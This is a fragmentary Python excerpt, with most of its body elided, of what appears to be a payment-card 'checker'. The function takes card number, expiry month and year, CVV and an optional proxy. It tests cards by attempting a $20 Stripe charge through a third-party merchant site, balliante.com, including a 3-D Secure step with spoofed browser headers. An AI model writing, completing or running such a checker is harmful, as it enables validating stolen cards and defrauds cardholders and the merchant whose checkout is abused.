...
def check_stripe_charge(card, mes, ano, cvv, proxy=None):
    """
    Stripe $20 Charge checker via balliante.com
    ...
    try:
        ...
        try:
            ...
            if three_d_secure_2_source and stripe_account:
                headers = {
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                    'cache-control': 'no-cache',
                    'content-type': 'application/x-www-form-urlencoded',
...
async def async_stripe_charge(card, mes, ano, cvv, proxy=None):
    """Async wrapper for Stripe $20 charge"""
    loop = asyncio.get_event_loop()
    return await loop.run_in_executor(executor, check_stripe_charge, card, mes, ano, cvv, proxy)
